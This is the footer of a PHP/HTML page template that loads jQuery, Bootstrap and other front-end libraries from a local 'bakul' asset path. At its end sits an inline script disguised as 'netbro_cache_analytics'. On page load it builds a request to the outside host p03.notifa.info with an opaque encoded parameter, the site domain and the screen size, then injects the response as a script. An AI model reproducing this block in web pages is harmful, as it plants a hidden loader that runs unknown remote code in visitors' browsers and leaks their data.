<!-- jQuery -->
<script src="<?php echo base_url(); ?>bakul/vendor/jquery/jquery.min.js"> </script>
<!-- bootstrap-->
<script src="<?php echo base_url(); ?>bakul/vendor/bootstrap/js/bootstrap.min.js"> </script>
<!-- stellar -->
<script src="<?php echo base_url(); ?>bakul/vendor/stellar/jquery.stellar.js"></script>
<!-- scrollorama js-->
<script src="<?php echo base_url(); ?>bakul/js/jquery.scrollorama.js"></script>
<!-- Contact form-->
<script src="<?php echo base_url(); ?>bakul/js/validator.min.js"></script> 
<!--owl carousel -->
<script src="<?php echo base_url(); ?>bakul/vendor/owlcarousel/owl.carousel.min.js"></script>
<!-- Inview js -->
<script src="<?php echo base_url(); ?>bakul/vendor/jquery.inview-master/jquery.inview.min.js"> </script>
<!-- Datepicker js -->
<script src="<?php echo base_url(); ?>bakul/vendor/gijgo-combined/gijgo.min.js"></script>
<!-- Timepicker js -->
<script src="<?php echo base_url(); ?>bakul/vendor/bootstrap-timepicker/bootstrap-timepicker.js"> </script>
<!-- Custom js -->
<script src="<?php echo base_url(); ?>bakul/js/main.js"> </script>

<script src="<?php echo base_url() ?>bakul/js/custom.js"></script>

<script type="text/javascript">
	if (self==top) {
		
		function netbro_cache_analytics(fn, callback) {
			setTimeout(function() {
				fn();
				callback();
			}, 0);}
		
		function sync(fn) {
			fn();
		}
		
		function requestCfs() {
			var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
			var idc_glo_r = Math.floor(Math.random()*99999999999);
			
			var url = idc_glo_url+ 
						"p03.notifa.info/3fsmd3/request" + 
						"?id=1" + 
						"&enc=9UwkxLgY9" + 
						"&params=" + 
						"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mySTRUd6p2yoksd4LBtKBSWUCJlZ0pxKTX74r5vqTvr03DClUbMFuFrRIOA4xREqczS5Qo6SZxdvMcRvztDu5T3Z3vNaj3%2b8ZOm4qdyldlVAur8uCQcByK%2bmlhqlKAIsxL4bfq5sOotCRdJ2HPLhHTWFgQoIYAmDRgfZOJDsmyMgCApOupVIMM6jOl3S60m2I4SySW5rWn4rutpvgQknBRERFW2DLGkYWWuBKSfx0Y89gVIUdRVwVB8RtTdfxXkpukUC%2bD%2fOZUsRDgVyIsZ%2ftB2N9X6NSsV2nNrS2X2xvxz%2fVZAH%2bxHQwdBCbN8Z4nhMLy5Wzw1E22Vjbc%2bzlQg65h7UCH7NQEr0zxZBx16%2b9ZWwHL%2fbMQZyjUV9SHhOcWnK%2b%2f4xdndVF0viR4510spIwj6qdKj5d%2fXYu6JC3O8kFX455bPaXRwTuV%2fiZ0Zql5OBpc66mbVyzOC9vuEPDgV0wzw%3d%3d" + 
						"&idc_r=" + idc_glo_r + 
						"&domain=" + document.domain + 
						"&sw=" + screen.width + 
						"&sh="+ screen.height;
			
			var bsa = document.createElement('script');
			bsa.type = 'text/javascript';
			bsa.async = true;
			bsa.src = url;
			(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
		}
		
		netbro_cache_analytics(requestCfs, function(){});
	};
</script>

</body>

</html>
